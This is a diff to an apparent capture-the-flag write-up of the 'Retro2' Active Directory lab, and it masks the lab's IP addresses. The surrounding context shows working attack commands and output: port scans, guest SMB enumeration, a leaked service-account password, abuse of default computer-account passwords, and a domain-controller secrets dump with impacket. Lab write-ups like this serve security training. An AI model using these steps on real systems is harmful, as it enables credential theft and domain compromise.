@@ -17,7 +17,7 @@ difficulty: Easy
 ```
 ❯ sudo nmap -p- --min-rate 5000 --open -sS -n -Pn -oG allports $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 20:09 CET
-Nmap scan report for 10.129.5.22
+Nmap scan report for 10.129.xx.xx
 Host is up (0.042s latency).
 Not shown: 65516 filtered tcp ports (no-response)
 Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
@@ -49,7 +49,7 @@ Scripts and versions.
 ```
 ❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5722,9389,49154,49155,49157,49158,49167 -sCV -Pn -oN targeted $target
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 20:10 CET
-Nmap scan report for 10.129.5.22
+Nmap scan report for 10.129.xx.xx
 Host is up (0.78s latency).
 
 PORT      STATE SERVICE       VERSION
@@ -123,24 +123,24 @@ We obtained some results from this nmap scan:
 
 ```
 ❯ echo "$target retro2.vl BLN01.retro2.vl" | sudo tee -a /etc/hosts
-10.129.5.22 retro2.vl BLN01.retro2.vl
+10.129.xx.xx retro2.vl BLN01.retro2.vl
 ```
 
 ## SMB
 Scanning the SMB share:
 ```
 ❯ nxc smb retro2.vl -u 'guest' -p '' --shares
-SMB         10.129.5.22     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.129.5.22     445    BLN01            [+] retro2.vl\guest: 
-SMB         10.129.5.22     445    BLN01            [*] Enumerated shares
-SMB         10.129.5.22     445    BLN01            Share           Permissions     Remark
-SMB         10.129.5.22     445    BLN01            -----           -----------     ------
-SMB         10.129.5.22     445    BLN01            ADMIN$                          Remote Admin
-SMB         10.129.5.22     445    BLN01            C$                              Default share
-SMB         10.129.5.22     445    BLN01            IPC$                            Remote IPC
-SMB         10.129.5.22     445    BLN01            NETLOGON                        Logon server share 
-SMB         10.129.5.22     445    BLN01            Public          READ            
-SMB         10.129.5.22     445    BLN01            SYSVOL                          Logon server share
+SMB         10.129.xx.xx     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.xx.xx     445    BLN01            [+] retro2.vl\guest: 
+SMB         10.129.xx.xx     445    BLN01            [*] Enumerated shares
+SMB         10.129.xx.xx     445    BLN01            Share           Permissions     Remark
+SMB         10.129.xx.xx     445    BLN01            -----           -----------     ------
+SMB         10.129.xx.xx     445    BLN01            ADMIN$                          Remote Admin
+SMB         10.129.xx.xx     445    BLN01            C$                              Default share
+SMB         10.129.xx.xx     445    BLN01            IPC$                            Remote IPC
+SMB         10.129.xx.xx     445    BLN01            NETLOGON                        Logon server share 
+SMB         10.129.xx.xx     445    BLN01            Public          READ            
+SMB         10.129.xx.xx     445    BLN01            SYSVOL                          Logon server share
 ```
 
 We can read the files, let's explore the share `Public` in depth with `smbclient`.
@@ -212,8 +212,8 @@ In the Access file we can see some credentials:
 ## Checking the ldapreader account
 ```
 ❯ nxc ldap BLN01.retro2.vl -u 'ldapreader' -p 'ppYaVcB5R'
-LDAP        10.129.5.22     389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert) 
-LDAP        10.129.5.22     389    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R
+LDAP        10.129.xx.xx     389    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 (name:BLN01) (domain:retro2.vl) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.xx.xx     389    BLN01            [+] retro2.vl\ldapreader:ppYaVcB5R
 ```
 
 Let's run Bloodhound to get the domain information:
@@ -259,8 +259,8 @@ For example, for this machine `FS01`, the credentials should be like this:
 Let's try that with netexec:
 ```
 ❯ nxc smb BLN01.retro2.vl -u 'fs01$' -p 'fs01'
-SMB         10.129.5.22     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.129.5.22     445    BLN01            [-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+SMB         10.129.xx.xx     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.xx.xx     445    BLN01            [-] retro2.vl\fs01$:fs01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
 ```
 
 The flag `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` means that the credentials are valid. We need to change the password first to be able to use it.
@@ -273,8 +273,8 @@ The flag `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` means that the credentials a
 Let's try now:
 ```
 ❯ nxc smb BLN01.retro2.vl -u 'fs01$' -p 'P@ssword123!'
-SMB         10.129.5.22     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.129.5.22     445    BLN01            [+] retro2.vl\fs01$:P@ssword123!
+SMB         10.129.xx.xx     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.xx.xx     445    BLN01            [+] retro2.vl\fs01$:P@ssword123!
 ```
 
 ## ADMWS01$ account
@@ -285,8 +285,8 @@ Using the same method:
 [+] Password changed successfully!
 
 ❯ nxc smb BLN01.retro2.vl -u 'ADMWS01$' -p 'P@ssword123!'
-SMB         10.129.5.22     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
-SMB         10.129.5.22     445    BLN01            [+] retro2.vl\ADMWS01$:P@ssword123!
+SMB         10.129.xx.xx     445    BLN01            [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:BLN01) (domain:retro2.vl) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.xx.xx     445    BLN01            [+] retro2.vl\ADMWS01$:P@ssword123!
 ```
 
 It works, now we can add the `ldapreader` user that we own to the `Services` group.
@@ -336,7 +336,7 @@ Exploit complete!
 
 Now we can dump the secrets.
 ```
-❯ impacket-secretsdump -just-dc -no-pass 'bln01$@10.129.5.22'
+❯ impacket-secretsdump -just-dc -no-pass 'bln01$@10.129.xx.xx'
 
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
